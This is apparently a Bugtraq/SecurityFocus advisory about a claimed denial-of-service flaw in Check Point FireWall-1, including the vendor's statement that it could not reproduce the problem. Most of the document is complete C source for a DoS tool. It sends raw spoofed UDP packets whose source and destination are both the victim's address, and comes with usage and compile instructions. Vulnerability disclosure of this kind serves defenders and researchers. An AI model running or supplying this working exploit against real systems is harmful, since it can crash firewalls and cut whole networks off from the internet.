source: http://www.securityfocus.com/bid/1419/info

If Checkpoint Firewall-1 receives a number of spoofed UDP packets with Source IP = Destination IP, the firewall (and likely the machine hosting it) crashes.

NOTE:

This vulnerability while being posted to Bugtraq is currently being denied as a problem by the vendor. The following text was sent to SecurityFocus.

"Check Point takes this and all other possible security issues very seriously. In this case, we have made every effort to work with the authors and reproduce the reported behavior. However, even after extensive testing we have been unable to reproduce this vulnerability. This testing was done both with and without IP Spoofing protection enabled, with the provided source code and other tools. The authors could not provide us with valid FireWall-1 version information, although 3.0, 4.0, and 4.1 are listed as vulnerable; please note that version 3.0 is no longer supported on non-embedded platforms.

/*
 *  CheckPoint IP Firewall Denial of Service Attack
 *  July 2000 
 *
 *  Bug found by: antipent <rtodd@antipentium.com>
 *  Code by: lore <fiddler@antisocial.com>
 *
 *  [Intro]
 *
 *  CheckPoint IP firewall crashes when it detects packets coming from
 *  a different MAC with the same IP address as itself. We simply
 *  send a few spoofed UDP packets to it, 100 or so should usually do
 *  it.
 *
 *  [Impact]
 *
 *  Crashes the firewall and usually the box its running on. Resulting
 *  in a complete stand still on the networks internet connectivity.
 *
 *  [Solution]
 *
 *  Turn on anti-spoofing, the firewall has an inbuilt function to do
 *  this.
 *
 *  [Disclaimer]
 *
 *  Don't use this code. It's for educational purposes.
 *
 *  [Example]
 *
 *  ./cpd 1.2.3.4 500 53
 *
 *  [Compile]
 *
 *  cc -o cpd cpd.c
 *
 *  [Support]
 *
 *  This is designed to compile on Linux. I would port it, but you're
 *  not meant to be running it anyway, right?
 *
 *  -- lore
 */

#define __BSD_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/ip_udp.h>

#define TRUE   1
#define FALSE  0
#define ERR   -1

typedef u_long         ip_t;
typedef long           sock_t;
typedef struct ip      iph_t;
typedef struct udphdr  udph_t;
typedef u_short        port_t;

#define IP_SIZE  (sizeof(iph_t))
#define UDP_SIZE (sizeof(udph_t))
#define PSIZE    (IP_SIZE + UDP_SIZE)
#define IP_OFF   (0)
#define UDP_OFF  (IP_OFF + IP_SIZE)

void     usage               __P ((u_char *));
u_short  checksum            __P ((u_short *, int));

int main (int argc, char * * argv)
{
  ip_t victim;
  sock_t fd;
  iph_t * ip_ptr;
  udph_t * udp_ptr;
  u_char packet[PSIZE];
  u_char * yes = "1";
  struct sockaddr_in sa;
  port_t aport;  
  u_long packets; 

  if (argc < 3) 
  {
    usage (argv[0]);
  }
  
  fprintf(stderr, "\n*** CheckPoint IP Firewall DoS\n");
  fprintf(stderr, "*** Bug discovered by: antipent <rtodd@antipentium.com>\n");
  fprintf(stderr, "*** Code by: lore <fiddler@antisocial.com>\n\n");

  if ((victim = inet_addr(argv[1])) == ERR)
  {
    fprintf(stderr, "Bad IP address '%s'\n", argv[1]);
    exit(EXIT_FAILURE);
  }

  else if (!(packets = atoi(argv[2])))
  {
    fprintf(stderr, "You should send at least 1 packet\n");
    exit(EXIT_FAILURE);
  }

  else if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == ERR)
  {
    fprintf(stderr, "Couldn't create raw socket: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }
 
  else if ((setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &yes, 1)) == ERR)
  {
    fprintf(stderr, "Couldn't set socket options: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }

  srand((unsigned)time(NULL));

  if (argc > 3)
  { 
    aport = htons(atoi(argv[3]));
  }
  else
  {
    aport = htons(rand() % 65535 + 1);
  }

  fprintf(stderr, "Sending packets: ");

  while (packets--)
  {

    memset(packet, 0, PSIZE);

    ip_ptr = (iph_t *)(packet + IP_OFF);
    udp_ptr = (udph_t *)(packet + UDP_OFF);

    ip_ptr->ip_hl = 5;
    ip_ptr->ip_v = 4;
    ip_ptr->ip_tos = 0;
    ip_ptr->ip_len = PSIZE;
    ip_ptr->ip_id = 1234;
    ip_ptr->ip_off = 0;
    ip_ptr->ip_ttl = 255;
    ip_ptr->ip_p = IPPROTO_UDP;
    ip_ptr->ip_sum = 0;
    ip_ptr->ip_src.s_addr = victim;
    ip_ptr->ip_dst.s_addr = victim; 

    udp_ptr->source = htons(rand() % 65535 + 1);
    udp_ptr->dest = aport;
    udp_ptr->len = htons(UDP_SIZE);
    udp_ptr->check = checksum((u_short *)ip_ptr, PSIZE);

    sa.sin_port = htons(aport);
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = victim;

    if ((sendto(fd, 
                packet,
                PSIZE,
                0,
                (struct sockaddr *)&sa,
                sizeof(struct sockaddr_in))) == ERR)
    {
      fprintf(stderr, "Couldn't send packet: %s\n",
        strerror(errno));
      close(fd);
      exit(EXIT_FAILURE);
    }
    fprintf(stderr, ".");

  }

  fprintf(stderr, "\n");
  close(fd);

  return (EXIT_SUCCESS);
}

void usage (u_char * pname)
{
  fprintf(stderr, "Usage: %s <victim_ip> <packets> [port]\n", pname);
  exit(EXIT_SUCCESS);
}

u_short checksum (u_short *addr, int len)
{
   register int nleft = len;
   register int sum = 0;
   u_short answer = 0;

   while (nleft > 1) {
      sum += *addr++;
      nleft -= 2;
   }

   if (nleft == 1) {
      *(u_char *)(&answer) = *(u_char *)addr;
      sum += answer;
   }

   sum = (sum >> 16) + (sum + 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
   return(answer);
}

/* EOF */